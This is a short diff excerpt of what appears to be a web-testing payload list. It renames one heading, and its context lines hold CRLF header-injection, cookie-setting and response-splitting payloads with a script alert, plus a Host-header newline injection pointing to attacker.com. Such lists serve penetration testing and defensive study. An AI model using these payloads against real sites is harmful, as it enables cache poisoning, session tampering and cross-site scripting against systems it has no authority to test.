@@ -6,7 +6,7 @@ param=value%0d%0aX-Injected-Header:attack
 param=value%0aSet-Cookie:admin=true
 param=value%0d%0aContent-Length:0%0d%0a%0d%0aHTTP/1.1%20200%20OK%0d%0aContent-Type:text/html%0d%0a%0d%0a<script>alert(1)</script>
 
-## HOST_HEADER_NEWLINE (Cloudflare HackerOne pattern)
+## HOST_HEADER_NEWLINE (CDN HackerOne pattern)
 Host: target.com\r\nX-Forwarded-Host: attacker.com
 
 ## CL_TE_SMUGGLING
